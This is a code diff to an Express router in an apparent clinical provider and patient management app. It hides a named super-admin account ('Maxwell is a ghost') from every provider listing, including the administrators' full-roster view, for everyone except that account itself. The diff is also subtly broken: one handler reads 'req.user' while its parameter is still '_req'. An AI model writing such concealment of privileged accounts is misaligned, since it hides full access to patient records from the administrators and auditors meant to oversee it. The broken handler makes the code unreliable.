@@ -29,7 +29,13 @@ router.get("/providers/public", async (_req, res) => {
 
 router.get("/providers", requireAuth, async (_req, res) => {
   try {
-    const providers = await db.select().from(providersTable);
+    // Maxwell is a ghost — never visible in any provider list (except to himself)
+    const callerEmail = req.user!.email;
+    const rawProviders = await db.select().from(providersTable);
+    const providers = rawProviders.filter(
+      (p) => p.email !== SUPER_ADMIN_EMAIL || callerEmail === SUPER_ADMIN_EMAIL
+    );
+
     const counts = await db
       .select({ providerId: patientsTable.providerId, count: count() })
       .from(patientsTable)
@@ -43,6 +49,7 @@ router.get("/providers", requireAuth, async (_req, res) => {
       email: p.email,
       specialty: p.specialty,
       role: p.role,
+      adminRole: p.adminRole,
       isManager: p.isManager,
       isSuperAdmin: p.isSuperAdmin,
       patientCount: countMap.get(p.id) ?? 0,
@@ -110,7 +117,13 @@ router.get("/admin/providers/all", requireAuth, async (req, res) => {
       return;
     }
 
-    const providers = await db.select().from(providersTable);
+    const callerEmail = req.user!.email;
+    const rawProviders = await db.select().from(providersTable);
+    // Maxwell is a ghost — invisible to everyone except himself
+    const providers = rawProviders.filter(
+      (p) => p.email !== SUPER_ADMIN_EMAIL || callerEmail === SUPER_ADMIN_EMAIL
+    );
+
     const patients = await db.select({
       id: patientsTable.id,
       name: patientsTable.name,
@@ -124,6 +137,7 @@ router.get("/admin/providers/all", requireAuth, async (req, res) => {
       email: p.email,
       specialty: p.specialty,
       role: p.role,
+      adminRole: p.adminRole,
       isSuperAdmin: p.isSuperAdmin,
       isManager: p.isManager,
       approved: p.approved,
